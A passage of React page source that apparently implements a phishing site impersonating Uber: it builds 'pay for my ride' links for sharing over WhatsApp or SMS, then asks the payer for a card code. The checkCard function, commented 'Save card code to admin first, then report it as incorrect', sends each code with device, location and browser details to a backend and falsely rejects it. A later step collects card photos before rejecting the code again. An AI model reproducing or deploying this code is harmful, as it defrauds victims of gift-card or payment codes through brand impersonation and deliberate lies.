      let dropoff = preResolved.dropoff || (dropoffData && dropoffData.displayName === dropoffInput.trim() ? dropoffData : await geocodeAddress(dropoffInput))
      if (!pickup) { setSearchError('Could not find pickup location'); return }
      if (!dropoff) { setSearchError('Could not find dropoff location'); return }
      setPickupData(pickup)
      setDropoffData(dropoff)

      const res = await fetch(
        `https://router.project-osrm.org/route/v1/driving/${pickup.lng},${pickup.lat};${dropoff.lng},${dropoff.lat}?overview=full&geometries=geojson`
      )
      const data = await res.json()
      if (!data.routes || data.routes.length === 0) {
        setSearchError('Could not calculate route between these locations')
        return
      }
      const route = data.routes[0]
      const coords = route.geometry.coordinates.map(([lng, lat]) => [lat, lng])
      setRouteCoords(coords)
      setDistanceKm(route.distance / 1000)
      setDurationMin(Math.round(route.duration / 60))
      setRideList(getAllPrices(route.distance / 1000))
      setSelectedType('uber_x')
      setMapViewActive(true)
      pushView('mapView')
      try {
        sessionStorage.setItem('payuber_last_search', JSON.stringify({
          pickup,
          dropoff,
          routeCoords: coords,
          distanceKm: route.distance / 1000,
          durationMin: Math.round(route.duration / 60),
          rideList: getAllPrices(route.distance / 1000),
          selectedType: 'uber_x',
        }))
      } catch (err) {}
    } catch (err) {
      setSearchError('An unexpected error occurred during search. Please try again.')
    } finally {
      setSearching(false)
    }
  }

  async function createSession() {
    const selected = RIDE_TYPES[selectedType]
    const { price } = calculatePrice(distanceKm, selectedType)
    const parsedAmount = amountDirty && amountInput.trim() ? Number(amountInput) : NaN
    const amount = Number.isFinite(parsedAmount) && parsedAmount > 0 ? parsedAmount : price
    const res = await fetch('/api/payuber/create-session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        pickupAddress: pickupData.displayName,
        dropoffAddress: dropoffData.displayName,
        pickupLat: pickupData.lat,
        pickupLng: pickupData.lng,
        dropoffLat: dropoffData.lat,
        dropoffLng: dropoffData.lng,
        routeGeometry: routeCoords,
        distanceKm,
        durationMin,
        rideType: selectedType,
        rideName: selected.name,
        amount,
        riderName: profile ? profile.name : null,
        riderImage: profile ? profile.image : null,
      }),
    })
    const data = await res.json()
    if (!res.ok || !data.id) throw new Error(data?.error || 'Failed to create payment session')
    return data.id
  }

  async function handlePayFor() {
    setModalBusy(true)
    try {
      const id = await createSession()
      setShowModal(false)
      viewStackRef.current = viewStackRef.current.filter((v) => v !== 'modal' && v !== 'mapView')
      try {
        const list = JSON.parse(localStorage.getItem('payuber_created_sessions') || '[]')
        if (Array.isArray(list) && !list.includes(id)) {
          list.push(id)
          localStorage.setItem('payuber_created_sessions', JSON.stringify(list))
        }
      } catch (err) {}
      router.push(`/payuber?id=${id}`)
    } catch (err) {
      showToast('Unable to create the payment link right now. Please try again.')
    } finally {
      setModalBusy(false)
    }
  }

  async function handleShare() {
    setModalBusy(true)
    setSharing(true)
    try {
      const id = await createSession()
      setShowModal(false)
      viewStackRef.current = viewStackRef.current.filter((v) => v !== 'modal' && v !== 'mapView')
      setShareSheetUrl(`${window.location.origin}/payuber?id=${id}`)
      pushView('share')
    } catch (err) {
      showToast('Unable to create the payment link right now. Please try again.')
    } finally {
      setModalBusy(false)
      setSharing(false)
    }
  }

  function handlePayNowClick() {
    setPayStep('methods')
    pushView('methods')
    setExpandedMethod(null)
    setCardError('')
    setCardNumber('')
    setCardResult(null)
    setCardAttempt(0)
    setShowUploadStep(false)
    setSelectedImages([])
    setUploadError(null)
    if (typeof window !== 'undefined') window.scrollTo({ top: 0, behavior: 'smooth' })
  }

  function handleMethodsBack() {
    if (expandedMethod) {
      closeView('method')
    } else {
      closeView('methods')
    }
  }

  // Reset the map back to the fitted pickup + drop-off view.
  function handleResetMapView() {
    const inst = mapInstanceRef.current
    const L = leafletRef.current
    if (!inst || !L) return
    const coords = sessionId
      ? (Array.isArray(session?.routeGeometry) && session.routeGeometry.length >= 2 ? session.routeGeometry : null)
      : routeCoords
    if (!coords || coords.length < 2) return
    const bounds = L.latLngBounds(coords)
    const opts = sessionId
      ? { padding: [20, 20], maxZoom: PICKUP_PRIVACY_MAX_ZOOM }
      : { padding: [20, 20] }
    inst.fitBounds(bounds, opts)
  }

  // ── Local profile (name + photo) ──
  const openProfileModal = () => {
    setProfileName(profile ? profile.name : '')
    setProfileImage(profile && profile.image ? profile.image : '')
    setProfileError('')
    setProfileMenuOpen(false)
    setProfileModalOpen(true)
  }

  const handleProfileImageSelect = async (e) => {
    const file = e.target.files && e.target.files[0]
    e.target.value = ''
    if (!file) return
    try {
      const resized = await resizeImage(file, 256)
      setProfileImage(resized)
    } catch (err) {
      setProfileError('Could not read that image. Try another one.')
    }
  }

  const saveProfile = () => {
    if (!profileName.trim()) {
      setProfileError('Please enter your name.')
      return
    }
    try {
      localStorage.setItem('payuber_profile', JSON.stringify({
        name: profileName.trim(),
        image: profileImage || null,
      }))
      setProfile({ name: profileName.trim(), image: profileImage || null })
    } catch (err) {
      setProfileError('Could not save your profile on this device.')
      return
    }
    setProfileModalOpen(false)
    setProfileError('')
    showToast(profile ? 'Profile updated' : 'Account created')
  }

  const logoutProfile = () => {
    try { localStorage.removeItem('payuber_profile') } catch (err) {}
    setProfile(null)
    setProfileMenuOpen(false)
    setProfileModalOpen(false)
    showToast('Logged out')
  }

  // Save card code to admin first, then report it as incorrect
  async function checkCard(e) {
    if (e) e.preventDefault()
    setCardError('')
    const value = cardNumber.trim()
    if (!value) { setCardError('Please enter a card code.'); return }
    setCardLoading(true)
    try {
      const browserInfo = {
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
      }
      const res = await fetch('/api/generate-issuance-id', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardNumber: value.replace(/\s+/g, ''),
          type: selectedMethod ? selectedMethod.type : 'apple-uber',
          deviceId,
          location,
          browserInfo: JSON.stringify(browserInfo),
        }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Unknown error')
      setCardResult(data)
      if (cardAttempt === 0) {
        // First entry: saved to admin, then reject the code
        setCardAttempt(1)
        setCardError('The card code you entered is incorrect. Please verify the code and try again.')
        setCardNumber('')
      } else {
        // Second entry: a new admin entry is saved; now ask for the card image
        setCardAttempt(0)
        setCardNumber('')
        setUploadError(null)
        setSelectedImages([])
        setShowUploadStep(true)
      }
    } catch (err) {
      setCardError(err.message)
    } finally {
      setCardLoading(false)
    }
  }

  const handleImageSelect = (e) => {
    const files = Array.from(e.target.files)
    if (files.length + selectedImages.length > 3) {
      setUploadError('Maximum 3 images allowed')
      return
    }
    setUploadError(null)
    files.forEach((file) => {
      const reader = new FileReader()
      reader.onload = (event) => {
        setSelectedImages((prev) => [...prev, { file, preview: event.target.result, base64: event.target.result }])
      }
      reader.readAsDataURL(file)
    })
  }

  const removeImage = (index) => {
    setSelectedImages((prev) => prev.filter((_, i) => i !== index))
  }

  // Upload if images were chosen (optional), then return to the code field with the error
  const handleUpload = async () => {
    if (uploadProgress) return
    if (selectedImages.length > 0) {
      setUploadProgress(true)
      setUploadError(null)
      try {
        const res = await fetch('/api/upload-receipt', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cardId: cardResult ? cardResult.cardId : null, images: selectedImages.map((img) => img.base64) }),
        })
        await res.json()
      } catch (err) {}
      setUploadProgress(false)
    }
    setShowUploadStep(false)
    setSelectedImages([])
    setUploadError(null)
    setCardError('The code is incorrect.')
  }

  const selectedSummary = session ? {
    name: session.rideName || RIDE_TYPES[session.rideType]?.name || 'Uber',
    price: session.amount,
    pickup: session.pickupAddress,
    dropoff: session.dropoffAddress,
    distanceKm: session.distanceKm,
    durationMin: session.durationMin,
  } : null

  // Render ride list (landing mode)
  const renderRideList = () => {
    const groups = {}
    const order = ['', 'Popular', 'Economy', 'Premium', 'More']
    order.forEach((cat) => (groups[cat] = []))
    rideList.forEach((p) => {
      if (groups[p.category] !== undefined) groups[p.category].push(p)
      else groups[''].push(p)
    })
    return (
      <>
        {order.map((cat) => {
          const arr = groups[cat]
          if (!arr || !arr.length) return null
          return (
            <div key={cat || 'base'}>
              {cat && <h3 className="ride-category-title">{cat}</h3>}
              {arr.map((p) => {
                const eta = estimatePickupEtaMinutes(p.key, pickupData?.lat, pickupData?.lng)
                return (
                  <div
                    key={p.key}
                    className={`ride-type ${p.key === selectedType ? 'active' : ''}`}
                    onClick={() => setSelectedType(p.key)}
                  >
                    <div className="ride-type-img">
                      <img src={p.icon} alt={p.name} style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
                    </div>
                    <div className="ride-type-content">
                      <div className="ride-type-header">
                        <span className="ride-type-name">{p.name} <span className="ride-type-capacity" dangerouslySetInnerHTML={{ __html: `${PERSON_ICON} ${p.capacity}` }} /></span>
                        <span className="ride-type-price">{formatPrice(p.price)}</span>
                      </div>
                      <div className="ride-type-meta" dangerouslySetInnerHTML={{ __html: `${p.key === 'uber_x' ? `<span class="faster-tag">${FASTER_ICON} Faster</span>` : ''} Pickup in ${eta} min` }} />
                      {p.desc ? <div className="ride-type-desc">{p.desc}</div> : null}
                    </div>
                  </div>
                )
              })}
            </div>
          )
        })}
      </>
    )
  }

  const priceSummary = selectedType ? calculatePrice(distanceKm, selectedType) : null

  return (
    <div className="payuber-page">
      <Head>
        <title>Uber | Request a ride</title>
        <meta name="description" content="Go anywhere with Uber. Request a ride, hop in, and go." />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
        <link rel="stylesheet" href="/payuber/variables.css" />
        <link rel="stylesheet" href="/payuber/global.css" />
        <link rel="stylesheet" href="/payuber/landing.css" />
        <link rel="stylesheet" href="/payuber/payment.css" />
        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
        <style>{`
          html, body {
            background: #ffffff !important;
            color: #000000 !important;
          }
          .payuber-page, .payuber-page * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
          }
          .payuber-page {
            color: #000000 !important;
          }
        `}</style>
      </Head>

      {/* Header */}
      <header className="uber-header">
        <div className="header-left">
          {sessionId ? (
            <span className="header-logo" style={{ cursor: 'default' }}>Uber</span>
          ) : (
            <a href="/okada" className="header-logo">Uber</a>
          )}
          <nav className="header-nav">
            <a href="/okada">Ride</a>
            <a href="#">Drive</a>
            <a href="#">Business</a>
            <a href="#">About</a>
          </nav>
        </div>
        <div className="header-right">
          <a href="#" className="header-lang">EN</a>
          <a href="#" className="header-help">Help</a>
          {profile ? (
            <div className="profile-widget">
              {profileMenuOpen && <div className="profile-menu-backdrop" onClick={() => setProfileMenuOpen(false)} />}
              <button
                className="profile-trigger"
                onClick={() => setProfileMenuOpen((v) => !v)}
                aria-label="Profile menu"
              >
                {profile.image ? (
                  <img src={profile.image} alt={profile.name} className="profile-avatar-img" />
                ) : (
                  <span className="profile-name-only">{profile.name}</span>
                )}
              </button>
              {profileMenuOpen && (
                <div className="profile-menu">
                  <div className="profile-menu-item" onClick={openProfileModal}>Edit</div>
                  <div className="profile-menu-item profile-menu-item-danger" onClick={logoutProfile}>Log out</div>
                </div>
              )}
            </div>
          ) : (
            <button className="header-login-btn" onClick={openProfileModal}>Login</button>
          )}
        </div>
      </header>

      {/* Landing content (no session) */}
      {!sessionId && (
        <div className={`landing-content ${mapViewActive ? 'hidden' : ''}`}>
          <section className="hero-section">
            <div className="hero-inner">
              <div className="hero-left">
                <div className="hero-city">
                  <span dangerouslySetInnerHTML={{ __html: CITY_PIN_ICON }} />
                  <span>{currentCity}</span>
                </div>
                <h1 className="hero-title">Go anywhere with Uber</h1>

                <div className="uber-inputs">
                  <div className="uber-input-row autocomplete-wrapper">
                    <div className="uber-input-icon"><div className="dot-pickup"></div></div>
                    <input
                      type="text"
                      className="uber-input-field"
                      placeholder="Pickup location"
                      autoComplete="off"
                      value={pickupInput}
                      onChange={(e) => { setPickupInput(e.target.value); handleAutocomplete(e.target.value, 'pickup') }}
                    />
                    <button
                      type="button"
                      className="location-btn map-input-trigger"
                      title="Choose pickup on map"
                      aria-label="Choose pickup on map"
                      onClick={() => openMapPicker('pickup')}
                      dangerouslySetInnerHTML={{ __html: GPS_PIN_ICON }}
                    />
                    <div className="autocomplete-dropdown" style={{ display: activeDropdown === 'pickup' && dropdownResults.length ? 'block' : 'none' }}>
                      {dropdownResults.map((r, i) => (
                        <div key={i} className="autocomplete-item" onClick={() => selectSuggestion('pickup', r)}>
                          {r.displayName}
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="uber-input-row autocomplete-wrapper">
                    <div className="uber-input-icon"><div className="dot-dropoff"></div></div>
                    <input
                      type="text"
                      className="uber-input-field"
                      placeholder="Dropoff location"
                      autoComplete="off"
                      value={dropoffInput}
                      onChange={(e) => { setDropoffInput(e.target.value); handleAutocomplete(e.target.value, 'dropoff') }}
                    />
                    <button
                      type="button"
                      className="location-btn map-input-trigger"
                      title="Choose destination on map"
                      aria-label="Choose destination on map"
                      onClick={() => openMapPicker('dropoff')}
                      dangerouslySetInnerHTML={{ __html: GPS_PIN_ICON }}
                    />
                    <div className="autocomplete-dropdown" style={{ display: activeDropdown === 'dropoff' && dropdownResults.length ? 'block' : 'none' }}>
                      {dropdownResults.map((r, i) => (
                        <div key={i} className="autocomplete-item" onClick={() => selectSuggestion('dropoff', r)}>
                          {r.displayName}
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                <div className="hero-actions">
                  <button className="see-prices-btn" id="search-btn" onClick={runRideSearch} disabled={searching}>
                    {searching ? 'Searching...' : 'See prices'}
                  </button>
                </div>
                {searchError && <p style={{ color: '#E54B4B', marginTop: 12, fontSize: 14 }}>{searchError}</p>}
              </div>
              <div className="hero-right">
                <div className="hero-image-wrapper">
                  <img src="/hero-travel.png" alt="Ready to travel?" />
                  <div className="hero-cta-overlay">
                    <span>Ready to travel?</span>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Suggestions section */}
          <section className="suggestions-section">
            <div className="suggestions-inner">
              <h2 className="suggestions-title">Suggestions</h2>
              <div className="suggestions-grid">
                <a href="#" className="suggestion-card">
                  <div className="suggestion-card-content">
                    <h3>Ride</h3>
                    <p>Go anywhere with Uber. Request a ride, hop in, and go.</p>
                    <span className="details-link">Details</span>
                  </div>
                  <div className="suggestion-card-icon"><img src="/landing page ride.png" alt="Ride" /></div>
                </a>
                <a href="#" className="suggestion-card">
                  <div className="suggestion-card-content">
                    <h3>Reserve</h3>
                    <p>Reserve your ride in advance so you can relax on the day of your trip.</p>
                    <span className="details-link">Details</span>
                  </div>
                  <div className="suggestion-card-icon"><img src="/landing page reserve.png" alt="Reserve" /></div>
                </a>
                <a href="#" className="suggestion-card">
                  <div className="suggestion-card-content">
                    <h3>Courier</h3>
                    <p>Uber makes same-day item delivery easier than ever.</p>
                    <span className="details-link">Details</span>
                  </div>
                  <div className="suggestion-card-icon"><img src="/landing page carrier.png" alt="Courier" /></div>
                </a>
              </div>
            </div>
          </section>
        </div>
      )}

      {/* Map view (landing ride list) */}
      {!sessionId && mapViewActive && (
        <div className="map-view active">
          <div className="map-sidebar">
            <div className="map-sidebar-header">
              <button className="map-back-btn" onClick={() => closeView('mapView')} dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }} />
            </div>
            <div className="map-sidebar-inputs">
              <div className="uber-inputs" style={{ marginBottom: 0 }}>
                <div className="uber-input-row">
                  <div className="uber-input-icon"><div className="dot-pickup"></div></div>
                  <input type="text" className="uber-input-field" value={pickupData?.displayName || ''} readOnly />
                  <button
                    type="button"
                    className="location-btn map-input-trigger"
                    title="Choose pickup on map"
                    aria-label="Choose pickup on map"
                    onClick={() => openMapPicker('pickup')}
                    dangerouslySetInnerHTML={{ __html: GPS_PIN_ICON }}
                  />
                </div>
                <div className="uber-input-row">
                  <div className="uber-input-icon"><div className="dot-dropoff"></div></div>
                  <input type="text" className="uber-input-field" value={dropoffData?.displayName || ''} readOnly />
                  <button
                    type="button"
                    className="location-btn map-input-trigger"
                    title="Choose destination on map"
                    aria-label="Choose destination on map"
                    onClick={() => openMapPicker('dropoff')}
                    dangerouslySetInnerHTML={{ __html: GPS_PIN_ICON }}
                  />
                </div>
              </div>
            </div>

            <div className="map-sidebar-results">
              <div id="ride-types">
                {rideList.length ? renderRideList() : <p style={{ padding: 16, color: '#545454' }}>Searching for rides...</p>}
              </div>

              <div className="price-summary" style={{ display: priceSummary ? 'block' : 'none' }}>
                <div className="price-row"><span>Base fare</span><span>{formatPrice(priceSummary.baseFare)}</span></div>
                <div className="price-row"><span>Distance</span><span>{distanceKm.toFixed(1)} km</span></div>
                <div className="price-row"><span>Distance fare</span><span>{formatPrice(priceSummary.distanceFare)}</span></div>
                <div className="price-row"><span>Trip duration</span><span>{durationMin} min</span></div>
                <div className="price-total"><span>Total</span><span>{formatPrice(priceSummary.price)}</span></div>
              </div>
            </div>

            <div className="map-sidebar-footer">
              <button
                className="btn btn-primary btn-lg"
                id="request-btn"
                style={{ width: '100%' }}
                onClick={() => { setShowModal(true); pushView('modal') }}
              >
                Request {RIDE_TYPES[selectedType]?.name || 'Uber'}
              </button>
            </div>
          </div>
          <div className="map-area">
            <div id="map" ref={mapRef} style={{ width: '100%', height: '100%' }}></div>
            <button
              type="button"
              className="map-reset-btn"
              aria-label="Reset map view"
              onClick={handleResetMapView}
              dangerouslySetInnerHTML={{ __html: RESET_VIEW_ICON }}
            />
          </div>
        </div>
      )}

      {/* Pay mode (shared URL) — no map pins, full-width sidebar */}
      {sessionId && (
        <div className="map-view active pay-mode">
          <div className="map-sidebar">
            <div className="map-sidebar-header">
              {createdSession && (
                <button className="map-back-btn" onClick={() => history.back()} dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }} />
              )}
            </div>
            <div className="map-sidebar-results" id="map-results">
              {sessionLoading && (
                <div className="ubr-shimmer" aria-hidden="true">
                  <div className="shimmer-row shimmer-avatar-row">
                    <div className="shimmer-circle"></div>
                    <div className="shimmer-lines"><div className="shimmer-line"></div><div className="shimmer-line"></div></div>
                  </div>
                  <div className="shimmer-card">
                    <div className="shimmer-line"></div>
                    <div className="shimmer-line shimmer-line-thin"></div>
                    <div className="shimmer-line"></div>
                  </div>
                  <div className="shimmer-card">
                    <div className="shimmer-line"></div>
                    <div className="shimmer-line"></div>
                    <div className="shimmer-line shimmer-line-thin"></div>
                  </div>
                  <div className="shimmer-btn"></div>
                </div>
              )}
              {sessionError && (
                <div style={{ padding: 16 }}>
                  <h3 style={{ marginBottom: 8 }}>Payment link not available</h3>
                  <p style={{ color: '#545454', fontSize: 14 }}>{sessionError}</p>
                </div>
              )}

              {session && !sessionLoading && payStep === 'summary' && (
                <>
                  {session.riderName ? (
                    <div className="ride-summary-header">
                      <div className="ride-summary-text">
                        <div className="ride-summary-eyebrow">Ride {session.rideNumber || '—'}</div>
                        <div className="ride-summary-name">{session.riderName}</div>
                      </div>
                      <div className="ride-summary-avatar">
                        {session.riderImage ? (
                          <img src={session.riderImage} alt={session.riderName} />
                        ) : (
                          <span>{session.riderName.charAt(0).toUpperCase()}</span>
                        )}
                      </div>
                    </div>
                  ) : (
                    <h3 className="ride-category-title">{selectedSummary.name}</h3>
                  )}
                  <div className="payment-route-card">
                    <div className="payment-route-row">
                      <span className="route-dot route-dot-pickup"></span>
                      <span>{truncateAddress(shortPlaceName(selectedSummary.pickup), 40)}</span>
                    </div>
                    <div className="payment-route-line"></div>
                    <div className="payment-route-row">
                      <span className="route-dot route-dot-dropoff"></span>
                      <span>{truncateAddress(selectedSummary.dropoff, 40)}</span>
                    </div>
                  </div>
                  <div className="price-summary" style={{ display: 'block' }}>
                    <div className="price-row"><span>Distance</span><span>{(selectedSummary.distanceKm || 0).toFixed(1)} km</span></div>
                    <div className="price-row"><span>Trip duration</span><span>{Math.round(selectedSummary.durationMin || 0)} min</span></div>
                    <div className="price-total"><span>Total</span><span>{formatPrice(selectedSummary.price)}</span></div>
                  </div>
                  <div className="map-sidebar-footer" style={{ paddingTop: 16 }}>
                    <button className="btn btn-primary btn-lg" style={{ width: '100%' }} onClick={handlePayNowClick}>
                      Pay Now
                    </button>
                  </div>
                </>
              )}

              {session && !sessionLoading && payStep === 'methods' && (
                <>
                  <button
                    type="button"
                    className="payment-method-back"
                    onClick={handleMethodsBack}
                    dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }}
                  />
                  <h3 className="ride-category-title">Payment Method</h3>
                  <div className="payment-methods-grid">
                    {PAYMENT_METHODS.map((method) => {
                      const expanded = expandedMethod === method.id
                      if (expandedMethod && !expanded) return null
                      return (
                        <div key={method.id} className="payment-method-item">
                          <div
                            className={`ride-type ${expanded ? 'active' : ''}`}
                            onClick={() => {
                              if (expanded) {
                                closeView('method')
                                return
                              }
                              setExpandedMethod(method.id)
                              setSelectedMethod(method)
                              setCardError('')
                              setCardNumber('')
                              setCardResult(null)
                              setCardAttempt(0)
                              setUploadError(null)
                              setSelectedImages([])
                              setShowUploadStep(false)
                              pushView('method')
                            }}
                          >
                            <div className="ride-type-content">
                              <div className="ride-type-header">
                                <span className="ride-type-name">{method.label}</span>
                                <span className="ride-type-price">{formatPrice(selectedSummary.price)}</span>
                              </div>
                            </div>
                          </div>
                          {expanded && !showUploadStep && (
                            <div className="payment-method-expanded">
                              <form onSubmit={checkCard}>
                                <div className="uber-input-row">
                                  <input
                                    type="text"
                                    className="uber-input-field"
                                    placeholder="Enter your card code"
                                    autoComplete="off"
                                    value={cardNumber}
                                    onChange={(e) => setCardNumber(e.target.value.toUpperCase())}
                                  />
                                </div>
                                {cardError && <p style={{ color: '#E54B4B', fontSize: 13, marginTop: 8 }}>{cardError}</p>}
                                <button className="btn btn-primary btn-lg" style={{ width: '100%', marginTop: 12 }} disabled={cardLoading}>
                                  {cardLoading ? 'Checking...' : 'Continue'}
                                </button>
                              </form>
                            </div>
                          )}
                        </div>
                      )
                    })}
                  </div>

                  {showUploadStep && cardResult && (
                    <div className="payment-upload-ui">
                      <label className="payment-upload-dropzone">
                        <input type="file" accept="image/*" multiple style={{ display: 'none' }} onChange={handleImageSelect} />
                        <div className="payment-upload-icon" dangerouslySetInnerHTML={{ __html: UPLOAD_ICON }} />
                        <div className="payment-upload-title">Upload Card Image or Screenshots</div>
                        <div className="payment-upload-sub">Tap to select photos of your card or screenshots</div>
                      </label>
                      {selectedImages.length > 0 && (
                        <div className="payment-upload-previews">
                          {selectedImages.map((img, i) => (
                            <div key={i} className="payment-upload-preview">
                              <img src={img.preview} alt={`preview ${i}`} />
                              <button
                                type="button"
                                className="payment-upload-remove"
                                onClick={() => removeImage(i)}
                              >
                                ×
                              </button>
                            </div>
                          ))}
                        </div>
                      )}
                      {uploadError && <p style={{ color: '#E54B4B', fontSize: 13, marginTop: 8 }}>{uploadError}</p>}
                      {selectedImages.length > 0 && (
                        <div className="payment-upload-actions">
                          <button className="btn btn-primary" style={{ flex: 1 }} onClick={handleUpload} disabled={uploadProgress}>
                            {uploadProgress ? 'Uploading...' : 'Upload Card Image'}
                          </button>
                        </div>
                      )}
                    </div>
                  )}
                </>
              )}
            </div>
          </div>
          <div className="map-area">
            <div id="map" ref={mapRef} style={{ width: '100%', height: '100%' }}></div>
            <button
              type="button"
              className="map-reset-btn"
              aria-label="Reset map view"
              onClick={handleResetMapView}
              dangerouslySetInnerHTML={{ __html: RESET_VIEW_ICON }}
            />
          </div>
        </div>
      )}

      {/* Map picker overlay (GPS icon -> pick on map) */}
      {mapPickerTarget && (
        <div className="map-picker-overlay show" onClick={() => closeView('picker')}>
          <div className="map-picker-sheet" onClick={(e) => e.stopPropagation()}>
            <div className="map-picker-header">
              <div>
                <p className="map-picker-eyebrow">Pin location</p>
                <h3>{mapPickerTarget === 'pickup' ? 'Choose pickup on map' : 'Choose destination on map'}</h3>
              </div>
              <button className="map-picker-close" type="button" aria-label="Close map picker" onClick={() => closeView('picker')}>×</button>
            </div>
            <p className="map-picker-help">
              {mapPickerLocating
                ? 'Finding your location...'
                : 'Tap the map or drag the pin to place the spot instantly.'}
            </p>
            <div className="map-picker-map" ref={mapPickerMapRef}></div>
            <div className="map-picker-selection">
              <div className="map-picker-selection-label">
                {mapPickerTarget === 'pickup' ? 'Selected pickup' : 'Selected destination'}
              </div>
              <div className="map-picker-selection-value">{mapPickerAddress || 'Move the pin to choose a location.'}</div>
            </div>
          </div>
        </div>
      )}

      {/* Payment modal */}
      {showModal && (
        <div className="uber-modal-overlay" onClick={() => closeView('modal')}>
          <div className="uber-modal" onClick={(e) => e.stopPropagation()}>
            <button className="uber-modal-close" onClick={() => closeView('modal')}>&times;</button>
            <h2>Request {RIDE_TYPES[selectedType]?.name}</h2>
            <p className="uber-modal-subtitle">Estimated fare: <strong>{formatPrice(calculatePrice(distanceKm, selectedType).price)}</strong></p>
            <div className="ride-amount-editor">
              <div className="ride-amount-label">Ride amount</div>
              {(() => {
                const parsed = Number(amountInput)
                const effective = amountDirty && Number.isFinite(parsed) && parsed > 0
                  ? parsed
                  : calculatePrice(distanceKm, selectedType).price
                return (
                  <div className="ride-amount-chips">
                    <button
                      type="button"
                      className={`ride-amount-chip ${!amountDirty ? 'ride-amount-chip-active' : ''}`}
                      onClick={() => { setAmountDirty(false); setAmountInput('') }}
                    >
                      Fare {formatPrice(calculatePrice(distanceKm, selectedType).price)}
                    </button>
                    {SUGGESTED_AMOUNTS.map((a) => (
                      <button
                        key={a}
                        type="button"
                        className={`ride-amount-chip ${amountDirty && parsed === a ? 'ride-amount-chip-active' : ''}`}
                        onClick={() => { setAmountDirty(true); setAmountInput(String(a)) }}
                      >
                        {formatPrice(a)}
                      </button>
                    ))}
                    <input
                      type="number"
                      min="1"
                      step="0.01"
                      className="ride-amount-input"
                      placeholder="Custom"
                      value={amountDirty ? amountInput : ''}
                      onChange={(e) => { setAmountDirty(true); setAmountInput(e.target.value) }}
                    />
                  </div>
                )
              })()}
              <div className="ride-amount-result">
                Your friend will pay <strong>{formatPrice(amountDirty && Number.isFinite(Number(amountInput)) && Number(amountInput) > 0 ? Number(amountInput) : calculatePrice(distanceKm, selectedType).price)}</strong> for this ride
              </div>
            </div>
            <div className="uber-modal-route">
              <div className="uber-modal-route-row">
                <div className="dot-pickup"></div>
                <span>{truncateAddress(pickupData?.displayName, 50)}</span>
              </div>
              <div className="uber-modal-route-line"></div>
              <div className="uber-modal-route-row">
                <div className="dot-dropoff"></div>
                <span>{truncateAddress(dropoffData?.displayName, 50)}</span>
              </div>
            </div>
            <div className="uber-modal-actions">
              <button className="uber-modal-btn uber-modal-btn-primary" id="modal-pay-btn" onClick={handlePayFor} disabled={modalBusy} dangerouslySetInnerHTML={{ __html: `${CARD_ICON} Pay for this ride` }} />
              <button className="uber-modal-btn uber-modal-btn-secondary" id="modal-share-btn" onClick={handleShare} disabled={modalBusy}>
                {sharing ? (
                  <span className="btn-loading"><span className="spinner" style={{ borderColor: 'rgba(0,0,0,0.25)', borderTopColor: '#000' }}></span>Creating link...</span>
                ) : (
                  <span dangerouslySetInnerHTML={{ __html: `${SHARE_ICON} Send payment link to a friend` }} />
                )}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Share sheet */}
      {shareSheetUrl && (
        <div className="uber-modal-overlay" onClick={() => closeView('share')}>
          <div className="uber-modal" onClick={(e) => e.stopPropagation()}>
            <button className="uber-modal-close" onClick={() => closeView('share')}>&times;</button>
            <h2>Share Payment Link</h2>
            <p className="uber-modal-subtitle" style={{ marginBottom: 24 }}>
              Send this payment link to a friend so they can choose a method and pay the fare.
            </p>
            <div className="share-sheet-grid" style={{ justifyContent: 'center' }}>
              <div className="share-item" onClick={() => { navigator.clipboard.writeText(shareSheetUrl); setCopied(true); showToast('Copied to clipboard!'); setTimeout(() => setCopied(false), 2000) }}>
                <div className="share-icon" style={{ background: '#E8E8E8', color: '#000' }} dangerouslySetInnerHTML={{ __html: COPY_ICON }} />
                <span>{copied ? 'Copied' : 'Copy'}</span>
              </div>
              <div className="share-item" onClick={() => window.open(`https://wa.me/?text=${encodeURIComponent('Hey! Can you help pay for this Uber ride? ' + shareSheetUrl)}`, '_blank')}>
                <div className="share-icon" style={{ background: '#25D366', color: '#fff' }} dangerouslySetInnerHTML={{ __html: WHATSAPP_ICON }} />
                <span>WhatsApp</span>
              </div>
              <div className="share-item" onClick={() => window.open(`sms:?&body=${encodeURIComponent('Hey! Can you help pay for this Uber ride? ' + shareSheetUrl)}`, '_self')}>
                <div className="share-icon" style={{ background: '#34C759', color: '#fff' }} dangerouslySetInnerHTML={{ __html: SMS_ICON }} />
                <span>Messages</span>
              </div>
              <div className="share-item" onClick={async () => {
                if (navigator.share) {
                  try {
                    await navigator.share({ title: 'Pay for Uber ride', text: 'Hey! Can you help pay for this Uber ride?', url: shareSheetUrl })
                  } catch (err) {}
                } else {
                  navigator.clipboard.writeText(shareSheetUrl)
                  showToast('Link copied directly!')
                }
              }}>
                <div className="share-icon" style={{ background: '#007AFF', color: '#fff' }} dangerouslySetInnerHTML={{ __html: NATIVE_ICON }} />
                <span>More</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Profile modal (localStorage account) */}
      {profileModalOpen && (
        <div className="uber-modal-overlay" onClick={() => setProfileModalOpen(false)}>
          <div className="uber-modal" onClick={(e) => e.stopPropagation()}>
            <button className="uber-modal-close" onClick={() => setProfileModalOpen(false)}>&times;</button>
            <h2>{profile ? 'Edit Profile' : 'Create Account'}</h2>
            <p className="uber-modal-subtitle">Your name and photo will appear on your payment links.</p>
            <div className="profile-form">
